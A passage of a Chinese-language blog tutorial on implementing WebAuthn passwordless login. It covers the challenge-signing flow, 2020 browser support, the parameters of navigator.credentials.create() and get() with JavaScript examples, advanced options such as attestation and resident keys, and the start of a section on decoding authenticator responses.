wp-image-2226\"></a>\n<ol>\n<li>浏览器向依赖方发送某个用户的验证请求</li>\n<li>依赖方向浏览器发送挑战</li>\n<li>浏览器向认证器发送挑战、依赖方信息和客户端信息以请求获取公钥凭证</li>\n<li>认证器请求用户动作，随后通过依赖方信息找到对应私钥，并使用私钥签名挑战（即断言），交给浏览器</li>\n<li>浏览器将签名后的挑战发送给依赖方</li>\n<li>依赖方用之前存储的公钥验证挑战是否与发送的一致，一致则验证成功</li>\n</ol>\n<p><button class=\"mdui-btn mdui-btn-raised mdui-ripple mdui-color-theme-accent\" disabled>开始验证</button> <span>在上方注册后才能验证</span></p>\n<div></div>\n<p>可以看到，WebAuthn 不仅在理论上是安全的，同时<strong>在整个过程中并没有隐私数据被传输</strong>——用户信息实际上只包含用户名和用户 ID。因此我们完全可以说 WebAuthn 是安全且私密的。</p>\n<blockquote><p>为了避免用户在不同依赖方之间被追踪，认证器通常会为每个依赖方和用户的组合都创建一对公私钥。不过，由于认证器的存储空间有限，认证器通常不会存储每一个私钥，而是会通过各类信息和烧录在认证器内的主密钥“算”出对应的私钥以实现无限对公私钥。具体算法根据不同厂商会有所不同。对于 Yubikey，你可以在<a href=\"https://developers.yubico.com/U2F/Protocol_details/Key_generation.html\">这里</a>了解更多。</p></blockquote>\n<blockquote><p>如果依赖方需要，用户同意后，发送给依赖方的公钥凭证中可以包含用于辨认认证器型号的信息，不过这对隐私的影响微乎其微。</p></blockquote>\n<h2>浏览器接口</h2>\n<p>要使用 WebAuthn，我们必须要依靠浏览器作为媒介和验证器进行交互，而这就需要浏览器对于 WebAuthn 的支持了。绝大多数新版本的现代浏览器都为 WebAuthn 提供了统一的接口，而在这一段中我们会了解如何使用相关的接口。但是在开始之前，我们可以先来看看浏览器的支持程度（2020.9）。</p>\n<div class=\"mdui-table-fluid\"><table class=\"mdui-table\">\n<thead><tr>\n<th>浏览器</th>\n<th>支持情况</th>\n</tr></thead>\n<tbody>\n<tr>\n<td>桌面端 Chrome</td>\n<td>67+</td>\n</tr>\n<tr>\n<td>移动端 Chrome</td>\n<td>67+<sup>[1]</sup>\n</td>\n</tr>\n<tr>\n<td>桌面端 Firefox</td>\n<td>60+</td>\n</tr>\n<tr>\n<td>移动端 Firefox</td>\n<td>不支持<sup>[2]</sup>\n</td>\n</tr>\n<tr>\n<td>桌面端 Edge</td>\n<td>18+</td>\n</tr>\n<tr>\n<td>移动端 Edge</td>\n<td>不支持<sup>[3]</sup>\n</td>\n</tr>\n<tr>\n<td>桌面端 Safari</td>\n<td>13+</td>\n</tr>\n<tr>\n<td>移动端 Safari</td>\n<td>13.3+<sup>[4]</sup>\n</td>\n</tr>\n<tr>\n<td>桌面端 Opera</td>\n<td>54+</td>\n</tr>\n<tr>\n<td>移动端 Opera</td>\n<td>不支持</td>\n</tr>\n</tbody>\n</table></div>\n<p><sup>[1]</sup> 受平台限制，Chrome 在 iOS 平台上不支持 WebAuthn，在 Android 平台上支持大部分 WebAuthn 功能，但仍不支持部分特性（如 <code>userVerification</code>）。<br><sup>[2]</sup> 移动端 Firefox 80 以下的版本支持 WebAuthn 但似乎会忽略 <code>authenticatorAttachment</code> 等一部分参数，同时移动端 Firefox Beta 80 以下的版本支持 WebAuthn 但无法成功调用。自 80 版本起移动端 Firefox 暂时取消了对 WebAuthn 的支持（可能是 Bug）。<br><sup>[3]</sup> 移动端 Edge 似乎支持 WebAuthn 但无法成功调用。<br><sup>[4]</sup> Safari iOS/iPad OS 13 仅支持外部认证器，无法调用 Touch ID 或 Face ID；自 iOS/iPad OS 14 起 Safari 已支持全功能 WebAuthn，可以调用 Touch ID/Face ID</p>\n<p>当然，一众国产浏览器，包括 Samsung Browser 和 Yandex Browser，目前都不支持 WebAuthn。此外，由于 WebAuthn 涉及外部验证器和 TPM 可信平台模块等，用户的操作系统也会对 WebAuthn 的可用性造成影响。以下是一些需要注意的信息：</p>\n<ul>\n<li>Windows 10 1903 以下版本仅 Edge 能提供完整支持，其他浏览器只能使用 USB Key 等外部认证器；1903+ 中所有浏览器都可以通过 Windows Hello 带来完整的 WebAuthn 支持</li>\n<li>Android 需要安装并开启 Google 服务</li>\n<li>iOS/iPad OS 13.3 以下的版本不支持 WebAuthn，iOS/iPad OS 14 以下的版本支持有限（参考上文），iOS/iPad OS 14 开始 Safari 已支持全功能 WebAuthn（功能完整度甚至超过了 Android）</li>\n</ul>\n<p>可以看出，WebAuthn 的发展之路仍然很漫长，但好在桌面端对它的支持已经比较完善了，在一些情况下我们完全有理由使用它。</p>\n<hr>\n<p>来看看浏览器提供了怎么样的接口吧。要使用 WebAuthn，我们可以使用 <code>navigator.credentials.create()</code> 请求认证器生成公钥凭证和 <code>navigator.credentials.get()</code> 请求获取公钥凭证。</p>\n<blockquote><p>你或许已经对 Credential Management API 有所了解了。通过这些 API，我们还可以实现一些有趣的特性，不过这值得另开一篇文章来讲了。</p></blockquote>\n<p>对于一个基础的实现，<code>navigator.credentials.create()</code> 需要传入的参数如下：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">navigator.credentials.create({\r\n    publicKey: {\r\n        challenge,\r\n        rp: {\r\n            id,\r\n            name\r\n        },\r\n        user: {\r\n            id,\r\n            name,\r\n            displayName\r\n        },\r\n        pubKeyCredParams: [\r\n            {\r\n                type: \"public-key\",\r\n                alg\r\n            }\r\n        ],\r\n        authenticatorSelection: {\r\n            authenticatorAttachment,\r\n            userVerification\r\n        },\r\n        excludeCredentials: [\r\n            {\r\n                id,\r\n                transports: [],\r\n                type: \"public-key\"\r\n            }\r\n        ],\r\n        timeout\r\n    }\r\n})</pre>\n<p>在 <code>navigator.credentials.create()</code> 方法中，我们必须传入一个对象，其中只有一对名为 <code>publicKey</code> 的键值。这指明了我们需要创建公钥凭证，而非普通的密码凭证。然后，在 <code>publicKey</code> 对象中设置这些常用参数：</p>\n<ul>\n<li>\n<code>challenge: Uint8Array</code>：转换为 <code>Uint8Array</code> 的挑战，长度至少为 16，建议为 32</li>\n<li>\n<code>rp: Object</code>：依赖方信息，其中有一项为必须：\n<ul>\n<li>\n<code>rp.id: String</code>：（可选）依赖方 ID，必须为当前域名或为当前域名的子集的域名（不是子域名）。如域名为 <code>test.123.example.com</code>，则依赖方 ID 可以是 <code>test.123.example.com</code>, <code>123.example.com</code> 或 <code>example.com</code>。不指定则默认使用当前域名</li>\n<li>\n<code>rp.name: String</code>：依赖方名称，用于方便用户辨认</li>\n</ul>\n</li>\n<li>\n<code>user: Object</code>：用户信息，其中有三项为必须：\n<ul>\n<li>\n<code>user.id: Uint8Array</code>：转换为 <code>Uint8Array</code> 的字符串。<strong>出于安全考量，这应尽可能不与任何用户信息相关联，如不要包含用户名、用户邮箱等</strong>\n</li>\n<li>\n<code>user.name: String</code>：登录用户名</li>\n<li>\n<code>user.dispalyName: String</code>：用于显示的用户名称，显示与否的具体行为取决于浏览器</li>\n</ul>\n</li>\n<li>\n<code>pubKeyCredParams: Array</code>：一个算法列表，指明依赖方接受哪些签名算法。列表的每一项都是一个对象，拥有两个属性：\n<ul>\n<li>\n<code>pubKeyCredParams[].type: String</code>：值只能为 “public-key”</li>\n<li>\n<code>pubKeyCredParams[].alg: Number</code>：一个负整数，用于标明算法。具体算法对应的数字可以在 <a href=\"https://www.iana.org/assignments/cose/cose.xhtml#algorithms\">COSE</a> 找到</li>\n</ul>\n</li>\n<li>\n<code>authenticatorSelection: Object</code>：（可选）用于过滤正确的认证器，这里介绍常用的一个参数：\n<ul>\n<li>\n<code>authenticatorSelection.authenticatorAttachment: String</code>：（可选）指定要求的认证器类型。如果没有满足要求的认证器，认证可能会失败。该参数可以为 <code>null</code>（表示接受所有类型的认证器）或是以下两个值之一：\n<ul>\n<li>\n<code>platform</code>：表示仅接受平台内置的、无法移除的认证器，如手机的指纹识别设备</li>\n<li>\n<code>cross-platform</code>：表示仅接受外部认证器，如 USB Key</li>\n</ul>\n</li>\n<li>\n<code>authenticatorSelection.userVerification: String</code>：（可选）指定认证器是否需要验证“用户为本人 (User Verified, UV)”，否则只须“用户在场 (User Present, UP)”。具体验证过程取决于认证器（不同认证器的认证方法不同，也有认证器不支持用户验证），而对验证结果的处理情况则取决于依赖方。该参数可以为以下三个值之一：\n<ul>\n<li>\n<code>required</code>：依赖方要求用户验证</li>\n<li>\n<code>preferred</code>：（默认）依赖方希望有用户验证，但也接受用户在场的结果</li>\n<li>\n<code>discouraged</code>：依赖方不关心用户验证。对于 iOS/iPad OS 13，必须设置为此值，否则验证将失败</li>\n</ul>\n</li>\n</ul>\n</li>\n<li>\n<code>excludeCredentials: Array</code>：（可选）用于标识要排除的凭证，可以避免同一个用户多次注册同一个认证器。如果用户试图注册相同的认证器，用户代理会抛出 <code>InvalidStateError</code> 错误。数组中的每一项都是一个公钥凭证对象，包含以下属性：\n<ul>\n<li>\n<code>excludeCredentials[].type: String</code>：值只能为 “public-key”</li>\n<li>\n<code>excludeCredentials[].id: Uint8Array</code>：要排除的凭证 ID</li>\n<li>\n<code>excludeCredentials[].transports: Array</code>：（可选）用于指定该凭证所需的认证器与用户代理的通信方式，可以包含以下的一或多个字符串：\n<ul>\n<li>\n<code>usb</code>：可以通过 USB 连接的认证器</li>\n<li>\n<code>nfc</code>：可以通过 NFC 连接的认证器</li>\n<li>\n<code>ble</code>：可以通过蓝牙连接的认证器</li>\n<li>\n<code>internal</code>：平台内置的、无法移除的认证器</li>\n</ul>\n</li>\n</ul>\n</li>\n<li>\n<code>timeout: Number</code>：（可选）方法超时时间的毫秒数，超时后将强制终止 <code>create()</code> 并抛出错误。若不设置，将使用用户代理的默认值；若太大或太小，则使用最接近的用户代理默认值范围中的值。推荐值为 5000-120000</li>\n</ul>\n<blockquote><p>对于 <code>pubKeyCredParams</code>，通常我们只需添加 ES256 (alg: -7) 算法即可兼容大部分外部认证器，此外，再添加 RS256 (alg: -257) 算法即可兼容大部分平台内置认证器（如 Windows Hello）。当然，前端添加算法之后，后端也需要相应的算法支持。</p></blockquote>\n<blockquote><p>对于 <code>userVerification</code>，由于默认值 “preferred” 并不能很好地被所有设备支持，因此无论在 <code>create()</code> 中还是 <code>get()</code> 中不指定该参数都会在 Chrome 中触发一条警告。具体请参阅<a href=\"https://chromium.googlesource.com/chromium/src/+/master/content/browser/webauth/uv_preferred.md\">这个页面</a>。</p></blockquote>\n<p>调用 <code>create()</code> 之后，我们就可以拿到一个 <code>Promise</code>，并可以在 <code>then</code> 中获得认证器返回的 <code>PublicKeyCredential</code> 对象。以下是一个 <code>create()</code> 返回的 <code>PublicKeyCredential</code> 对象的例子：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">PublicKeyCredential {\r\n    rawId: ArrayBuffer(32) {},\r\n    response: AuthenticatorAttestationResponse {\r\n        attestationObject: ArrayBuffer(390) {},\r\n        clientDataJSON: ArrayBuffer(121) {}\r\n    },\r\n    id: \"VByF2w2hDXkVsevQFZdbOJdyCTGOrI1-sVEzOzsNnY0\",\r\n    type: \"public-key\"\r\n}</pre>\n<p>其中有：</p>\n<ul>\n<li>\n<code>id: String</code>：Base64URL 编码的凭证 ID</li>\n<li>\n<code>rawId: ArrayBuffer</code>：<code>ArrayBuffer</code> 的原始凭证 ID</li>\n<li>\n<code>type: String</code>：一定是 “public-key”</li>\n<li>\n<code>response: Object</code>：<code>AuthenticatorAttestationResponse</code> 对象，是 <code>PublicKeyCredential</code> 的主要部分，包含以下两个内容：\n<ul>\n<li>\n<code>response.clientDataJSON: ArrayBuffer</code>：客户端数据，包含 origin（即凭证请求来源）、挑战等信息</li>\n<li>\n<code>response.attestationObject: ArrayBuffer</code>：CBOR 编码的认证器数据，包含凭证公钥、凭证 ID、签名（如果有）、签名计数等信息</li>\n</ul>\n</li>\n</ul>\n<p>然后将 <code>ArrayBuffer</code> 们以合适的方式编码成字符串，我们就可以把 <code>PublicKeyCredential</code> 发送给依赖方以供验证与注册了。具体怎么操作，我们会在下文详细讨论。当然，别忘了 <code>catch()</code> 注册过程中抛出的任何错误。</p>\n<blockquote><p>你可能会认为在所有情况下，注册时认证器都会对挑战进行签名。实际上在大部分情况下（同时也是默认情况），<strong>注册时认证器并不会对挑战进行签名</strong>，<code>attestationObject</code> 并不会包含签名后的挑战。只有依赖方明确要求证明且用户同意（部分浏览器要求）后认证器才会对挑战进行签名（具体实现据情况会有所不同）。对此，<a href=\"https://developer.mozilla.org/en-US/docs/Web/API/Web_Authentication_API/Attestation_and_Assertion#Attestation\">MDN 解释道</a>“大部分情况下，用户注册公钥时我们会使用「初次使用时信任模型」(TOFU) ，此时验证公钥是没有必要的。”要了解更多关于证明的内容，请参阅“<a href=\"https://flyhigher.top/#verify-authenticator\">验证认证器</a>”一节。</p></blockquote>\n<p>而对于 <code>navigator.credentials.get()</code>，我们可以传入如下的参数：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">navigator.credentials.get({\r\n    publicKey: {\r\n        challenge,\r\n        rpId,\r\n        userVerification,\r\n        allowCredentials: [\r\n            {\r\n                id,\r\n                transports: [],\r\n                type: \"public-key\"\r\n            }\r\n        ],\r\n        timeout\r\n    }\r\n})</pre>\n<p>和 <code>create()</code> 一样，对于 <code>get()</code> 我们需要传入一个对象，其中只有一对名为 <code>publicKey</code> 的键值，指明我们需要获取的是公钥凭证而非普通的密码凭证。在 <code>publicKey</code> 对象中我们可以设置这些常用参数：</p>\n<ul>\n<li>\n<code>challenge: Uint8Array</code>：转换为 <code>Uint8Array</code> 的挑战，长度至少为 16，建议为 32</li>\n<li>\n<code>rpID: String</code>：（可选）依赖方 ID，需要和注册认证器时的一致。规则和上述的 <code>rp.id</code> 一致，不指定默认使用当前域名</li>\n<li>\n<code>userVerification: String</code>：和上文一样，只是需要注意它这次不在 <code>authenticatorSelection</code> 中了</li>\n<li>\n<code>allowCredentials: Array</code>：（可选）用于标识允许的凭证 ID，使用户代理找到正确的认证器。只有符合这个列表中凭证 ID 的凭证才能被成功返回。数组中的每一项都是对象，包含以下属性：\n<ul>\n<li>\n<code>allowCredentials[].type: String</code>：值只能为 “public-key”</li>\n<li>\n<code>allowCredentials[].id: Uint8Array</code>：允许的凭证 ID</li>\n<li>\n<code>allowCredentials[].transports: Array</code>：（可选）用于指定该凭证所需的认证器与用户代理的通信方式，可以包含以下的一或多个字符串：\n<ul>\n<li>\n<code>usb</code>：可以通过 USB 连接的认证器</li>\n<li>\n<code>nfc</code>：可以通过 NFC 连接的认证器</li>\n<li>\n<code>ble</code>：可以通过蓝牙连接的认证器</li>\n<li>\n<code>internal</code>：平台内置的、无法移除的认证器</li>\n</ul>\n</li>\n</ul>\n</li>\n<li>\n<code>timeout: Number</code>：（可选）方法超时时间的毫秒数，和上面的一样，推荐值为 5000-120000</li>\n</ul>\n<p>嗯，要传入的参数少多了。之后，和 <code>create()</code> 一样，调用 <code>get()</code> 之后，我们就可以拿到一个 <code>Promise</code> 并在 <code>then</code> 中获得认证器返回的 <code>PublicKeyCredential</code> 对象。以下是一个 <code>get()</code> 返回的 <code>PublicKeyCredential</code> 对象的例子：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">PublicKeyCredential {\r\n    rawId: ArrayBuffer(32) {},\r\n    response: AuthenticatorAssertionResponse {\r\n        authenticatorData: ArrayBuffer(37) {},\r\n        signature: ArrayBuffer(256) {},\r\n        userHandle: ArrayBuffer(64) {},\r\n        clientDataJSON: ArrayBuffer(118) {}\r\n    }\r\n    id: \"VByF2w2hDXkVsevQFZdbOJdyCTGOrI1-sVEzOzsNnY0\"\r\n    type: \"public-key\"\r\n}</pre>\n<p>这里的东西就比 <code>create()</code> 时拿到的要多了。看看我们拿到了什么吧：</p>\n<ul>\n<li>\n<code>id: String</code>：Base64URL 编码的凭证 ID</li>\n<li>\n<code>rawId: ArrayBuffer</code>：<code>ArrayBuffer</code> 的原始凭证 ID</li>\n<li>\n<code>type: String</code>：一定是 “public-key”</li>\n<li>\n<code>response: Object</code>：对于验证流程，认证会返回 <code>AuthenticatorAssertionResponse</code> 而不是 <code>AuthenticatorAttestationResponse</code> 对象，这个对象包含以下 4 个属性：\n<ul>\n<li>\n<code>response.authenticatorData: ArrayBuffer</code>：认证器信息，包含认证状态、签名计数等</li>\n<li>\n<code>response.signature: ArrayBuffer</code>：被认证器签名的 <code>authenticatorData</code> + <code>clientDataHash</code>（<code>clientDataJSON</code> 的 SHA-256 hash）</li>\n<li>\n<code>response.userHandle: ArrayBuffer</code>：<code>create()</code> 创建凭证时的用户 ID <code>user.id</code>。许多 U2F 设备不支持这一特性，这一项将会是 <code>null</code>\n</li>\n<li>\n<code>response.clientDataJSON: ArrayBuffer</code>：客户端数据，包含 origin（即凭证请求来源）、挑战等信息</li>\n</ul>\n</li>\n</ul>\n<p>同样地，我们将 <code>ArrayBuffer</code> 们以合适的方式编码成字符串后就可以把 <code>PublicKeyCredential</code> 发送给依赖方以供验证了。至于具体怎么做，别急，马上就来讲一讲。</p>\n<h2>简单实现</h2>\n<p>了这么多，我们终于可以实现一个简单的 WebAuthn 认证页面了。由于在实际操作中 WebAuthn 相关的数据解码和密码计算比较复杂，在服务器端我们可以使用第三方库来帮我们做这些脏活累活，我们只需专注于具体流程就可以了。</p>\n<p>要寻找可用的第三方库，你可以在 <a href=\"https://webauthn.io/\">webauthn.io</a> 上找到适用于各种语言的第三方库——除了 PHP（笑）。不过好在你可以在 GitHub 上找到几个不错的 PHP WebAuthn 库，比如 <a href=\"https://github.com/web-auth/webauthn-framework\">web-auth/webauthn-framework</a>。</p>\n<p>在我们的这个例子中，我们关心的主要是前端逻辑；而后端我们可以使用各类几乎已经做到开箱即用的第三方库，这样我们可以专注于流程而不必关心细节。当然如果你想了解后端的解码细节，可以阅读“<a href=\"https://flyhigher.top/#webauthn-decode\">手动解个码</a>”一节。</p>\n<hr>\n<p>让我们先从注册开始吧。现在，用户点击了注册认证器的按钮，一个请求被发送给服务器（也就是依赖方）。在最简单的情况中，依赖方需要将三个内容发送给浏览器：<strong>挑战、用户信息和用户已注册的凭证 ID 列表（即 <code>excludeCredentials</code>）</strong>。当然依赖方也可以自由选择发送更多信息，只要最终前端能构建合法的参数即可。</p>\n<p>挑战最终会被转换为 <code>Uint8Array</code>，即一组 0-255 的整数。如果使用 PHP，在后端我们可以这样生成 Base64 编码的挑战：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"php\">$challenge = \"\";\r\nfor($i = 0; $i \n<p>对于用户信息，我们需要登录名、显示名称和 ID 三项内容。我们可以从数据库中取出用户信息，也可以新建一份。需要注意的是，<strong>出于安全和隐私的考量，ID 不应该包含用户的任何信息，比如用户邮箱等。</strong>推荐的做法是和挑战一样，生成一个随机字符串/一组随机数，并将其于用户关联起来以供之后使用。</p>\n<p>发送已注册的凭证 ID 列表是为了防止用户重复注册同一个认证器。正确设置该列表后，如果用户试图注册同一个认证器，浏览器会中止流程并抛出 <code>InvalidStateError</code>。</p>\n<p>最后，别忘了将挑战等一些后续可能会用到的信息临时存储起来。Session 就是一个很好的选择。</p>\n<p>将所有信息发送到浏览器之后，我们应该可以构建出新建凭证所需的参数了。由于有多个参数需要以 <code>Uint8Array</code> 的形式传入，我们可以准备一个简单的工具函数帮我们将 Base64 的字符串转为 <code>Uint8Array</code>。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">function str2ab(str){\r\n    return Uint8Array.from(window.atob(str), c=&gt;c.charCodeAt(0));\r\n}</pre>\n<p>除了 <code>challenge</code>, <code>rp</code>, <code>user</code> 和 <code>excludeCredentials</code> 几部分需要你根据具体情况设置外，上文提到的其他参数一般可以这么设置：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">publicKey: {\r\n    challenge, // 自行设置\r\n    rp, // 自行设置\r\n    user, // 自行设置\r\n    pubKeyCredParams: [\r\n        {\r\n            type: \"public-key\",\r\n            alg: -7 // ES256\r\n        },\r\n        {\r\n            type: \"public-key\",\r\n            alg: -257 // RS256\r\n        }\r\n    ],\r\n    authenticatorSelection: {\r\n        userVerification: \"discouraged\",\r\n        authenticatorAttachment: null // 除非用户指定，大部分情况下无需指定\r\n    },\r\n    excludeCredentials, // 自行设置\r\n    timeout: 60000\r\n}</pre>\n<p>然后就是传入 <code>navigator.credentials.create()</code>，拿到 <code>PublicKeyCredential</code>。如果一切顺利，接下来我们就需要考虑如何将返回的内容传回依赖方了。由于我们拿到的很多都是 <code>ArrayBuffer</code>，我们需要将其进行编码。再准备一个工具函数吧：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">function array2b64String(a) {\r\n    return window.btoa(String.fromCharCode(...a));\r\n}</pre>\n<p>然后适当处理，我们就可以得到一个方便传输的 JSON 字符串了：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">navigator.credentials.create({publicKey}).then((credentialInfo) =&gt; {\r\n    const publicKeyCredential = {\r\n        id: credentialInfo.id,\r\n        type: credentialInfo.type,\r\n        rawId: array2b64String(new Uint8Array(credentialInfo.rawId)),\r\n        response: {\r\n            clientDataJSON: array2b64String(new Uint8Array(credentialInfo.response.clientDataJSON)),\r\n            attestationObject: array2b64String(new Uint8Array(credentialInfo.response.attestationObject))\r\n        }\r\n    };\r\n    return publicKeyCredential;\r\n}).then(JSON.stringify).then((authenticatorResponseJSON) =&gt; {\r\n    // 可以发送了\r\n}).catch((error) =&gt; {\r\n    console.warn(error); // 捕获错误\r\n})</pre>\n<p>依赖方收到数据以后，还需要做三件事：验证挑战、存储凭证 ID 和存储公钥。如果数据解码顺利，且收到的挑战和之前发送的一致，就可以认为注册成功，将凭证 ID 及公钥与用户关联起来。这一步有很多第三方库可以帮我们做，对于基础实现我们就不深入探究了。</p>\n<blockquote><p>由于不同厂商的认证器的实现方式不同，<strong>我们并不能保证凭证 ID 一定是全局唯一的</strong>，也就是说，凭证 ID 有可能碰撞——即使这些凭证实际上是不同的。依赖方在实现凭证 ID 的存储及查找时，需要注意和用户 ID 结合进行存储或查找，或是直接在注册认证器时在服务器端对比阻止相同的凭证 ID。</p></blockquote>\n<hr><p>接下来就可以进行验证了。某天，用户点击了验证按钮准备登录，于是浏览器发送了验证请求到依赖方，同时附上要登录的用户名。接下来依赖方至少需要发送两项内容给浏览器：<strong>挑战和用户已绑定的凭证 ID 列表（即 <code>allowCredentials</code>）。</strong></p>\n<p>之后前端的处理流程就和注册时基本一致了。只是需要注意验证流程中获取到的 <code>PublicKeyCredential</code> 的结构和注册时的稍有不同。</p>\n<p>当浏览器将数据传回后，依赖方需要做的事情就比之前要麻烦一些了。依赖方需要验证挑战，并用之前存储的公钥验证签名和签名计数。同样地，这一步有很多第三方库可以帮我们做。最后，如果验证全部通过，我们就可以允许用户登录了。</p>\n<p>到目前为止，我们已经实现了一个简单的 WebAuthn 验证服务。不过这只是一个最基础的实现，对于很多高安全要求的身份认证这是远远不够的。因此，我们需要摆脱对第三方库的依赖，深入了解 WebAuthn。你可以继续阅读“<a href=\"https://flyhigher.top/#deep-into-webauthn\">深入了解 WebAuthn</a>”部分，不过对于基础的 WebAuthn 实现，我们的旅程就到这里了。</p>\n<h2>拓展阅读</h2>\n<p>如果你的目标只是快速了解如何开发 WebAuthn，那么你阅读到这里就可以了。同时，上一节例子中的部分代码来自于我为了这篇文章开发的 WordPress 插件 WP-WebAuthn，这个插件可以为你的 WordPress 启用 WebAuthn 无密码登录（并非二步验证），你可以查阅插件的 <a href=\"https://github.com/yrccondor/wp-webauthn\">GitHub 存储库</a>了解更多，也可以自己安装试一试。</p>\n<p>如果你正在使用 Chrome 开发，Chrome 87+ 版本添加了一个 WebAuthn 开发者面板，可以帮助你在没有任何实体验证器的情况下开发 WebAuthn 功能。你可以在 Google 的<a href=\"https://developers.google.com/web/tools/chrome-devtools/webauthn\">这篇文章</a>中了解更多。不够，如果你正在使用 Firefox，很遗憾目前我还没有找到对应的开发工具或是浏览器扩展可用。</p>\n<p>如果你希望了解更多关于非对称加密的数学证明，可以查阅阮一峰老师的<a href=\"http://www.ruanyifeng.com/blog/2013/06/rsa_algorithm_part_one.html\">这篇文章</a>。</p>\n<p>如果你希望了解更多关于 Credential Management API 的信息，可以查阅<a href=\"https://medium.com/dev-channel/sign-in-on-the-web-credential-management-api-and-best-practices-d21aed14b6fe\">这篇文章</a>（英文）。</p>\n<p>如果你希望了解更多 WebAuthn 的细节，可以继续往下阅读。<span></span></p>\n<h1>深入了解 WebAuthn</h1>\n<p>如上文所说，如果摆脱对第三方库的依赖，或是要实现更安全的 WebAuthn，我们必须深入了解 WebAuthn。在这一部分中，我们会详细讨论上文没有提到的一些概念和参数，并了解 WebAuthn 中各类数据的结构以实现解码与验证。先来看一看一些进阶的选项吧。</p>\n<h2>进阶选项</h2>\n<p>没错，上文提到的传入 <code>navigator.credentials.create()</code> 和 <code>navigator.credentials.get()</code> 方法的参数其实只是所有参数的一部分。对于 <code>create()</code>，我们还可以配置这些可选内容（上文提及的已省略）：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">navigator.credentials.create({\r\n    publicKey: {\r\n        rp: {\r\n            icon\r\n        },\r\n        user: {\r\n            icon\r\n        },\r\n        attestation,\r\n        authenticatorSelection: {\r\n            requireResidentKey\r\n        },\r\n        extensions\r\n    }\r\n})</pre>\n</pre>\n<ul>\n<li>\n<code>rp.icon: String</code> 和 <code>user.icon</code>：是的，你可以为依赖方和用户设置图标，可以使用 HTTPS URL 或 Base64，一般长度不能超过 128 字节，不过大部分浏览器不会显示图标，或是有非常小的图片体积限制，所以一般没有使用这一属性的必要</li>\n<li>\n<code>attestation: String</code>：表明依赖方是否需要证明。可选三个值：\n<ul>\n<li>\n<code>none</code>：（默认）不需要证明。如上文所述，依赖方不关心证明，因此认证器不会签名。对于 iOS/iPad OS 13，必须设置为此值，否则验证将失败</li>\n<li>\n<code>indirect</code>：依赖方需要证明，但证明方式可由认证器选择。在支持匿名证明的认证器上，认证器会通过匿名证明的方式签名挑战，并向依赖方提供签名方式等信息</li>\n<li>\n<code>direct</code>：依赖方要求直接证明。此时认证器会使用烧录在认证器中的公钥进行签名，同时向依赖方提供签名方式等信息以供依赖方验证认证器是否可信。更多信息可以阅读“<a href=\"https://flyhigher.top/#verify-authenticator\">验证认证器</a>”一节</li>\n</ul>\n</li>\n<li>在 <code>authenticatorSelection</code> 中，我们还可以设置两个可选属性：\n<ul>\n<li>\n<code>authenticatorSelection.requireResidentKey: Boolean</code>：是否要求将私钥钥永久存储于认证器中。默认值为 <code>false</code>。对于 iOS/iPad OS 13，必须设置为 <code>false</code>，否则验证将失败</li>\n</ul>\n</li>\n</ul>\n<li>\n<code>extensions: Object</code>：WebAuthn 扩展，可以提供规范之外的配置和响应。由于实际情况中很少会使用这一特性，我们不会在这篇文章中讨论它</li>\n\n<blockquote><p>将 <code>requireResidentKey</code> 设置为 <code>true</code> 可以实现无用户名的登录，即认证器同时替代了用户名和密码。需要注意的是，尽管大部分认证器可以实现无限对公私钥，<strong>但能永久存储的私钥数量是有限的</strong>（对于 Yubikey，这通常是 25），因此只应在真正需要的时候启用此特性。我们会在“<a href=\"https://flyhigher.top/#login-without-username\">无用户名登录</a>”一节中详细讨论原因。</p></blockquote>\n<blockquote><p><strong>如果你没有高安全需求（如银行交易等），请不要向认证器索取证明</strong>，即将 <code>attestation</code> 设置为 \"none\"。对于普通身份认证来说，要求证明不必要的，且会有浏览器提示打扰到用户。</p></blockquote>\n<blockquote><p>Android 暂时无法实施用户验证，进而会导致依赖方验证失败。你可以在<a href=\"https://bugs.chromium.org/p/chromium/issues/detail?id=997538\">这里</a>追踪这个特性的实现情况。</p></blockquote>\n<blockquote>\n<p>对于 <code>extensions</code>，由于目前浏览器支持和应用范围有限，我们不会在这篇文章中涉及，不过你可以看一个例子：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">extensions: {\r\n    uvm: true, // 要求认证器返回用户进行验证的方法\r\n    txAuthSimple: \"Please proceed\" // 在认证器上显示与交易有关的简短消息\r\n}</pre>\n<p>你可以在<a href=\"https://www.w3.org/2019/01/webauthn-extensions.html\">这个页面</a>了解更多关于 <code>extensions</code> 的信息。</p>\n</blockquote>\n<p>对于 <code>get()</code>，我们其实只有一个可选内容没讲了，即 <code>extensions</code>。和上文一样，我们不会在这篇文章中讨论它。</p>\n<p>就这些了！<span></span></p>\n<h2>手动解个码</h2>\n<p>是时候看看如何手动解码了。我们将会在这一节中讨论认证器返回的数据的结构以及如何正确地解码它们。</p>\n<p>首先我们来看看如何处理注册过程中认证器发回的数据。假设所有 <code>ArrayBuffer</code> 类型的值都被正确地以 Base64 编码，且后端已经将 JSON 的字符串解析为字典。先来复习一下，我们得到的数据应该是这样的（数据较长，已省略一部分）：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\r\n    id: \"ZRBkDBCEtq...9XY8atOcbg\",\r\n    type: \"public-key\",\r\n    rawId: \"ZRBkDBCEtq...9XY8atOcbg==\",\r\n    response: {\r\n        clientDataJSON: \"eyJjaGFsbGVuZ2U...i5jcmVhdGUifQ==\",\r\n        attestationObject: \"o2NmbXRkbm9uZWd...xNHuAMzz2LxZA==\"\r\n    }\r\n}</pre>\n<p>这里的 <code>id</code> 就是凭证的 ID，如果验证正确，我们最终要将它存储起来并于用户关联。同时可以看到 Base64 编码后的 <code>rawId</code> 其实和 <code>id</code> 是一致的（不过 <code>id</code> 是 Base64URL 编码的）。而 <code>type</code> 则一定是 \"public-key\"。</p>\n<p>不过，我们主要关心的还是 <code>respose</code> 中的两项内容。首先是 <code>clientDataJSON</code>。它的处理比较简单，看名字就知道，它应该是一个 JSON 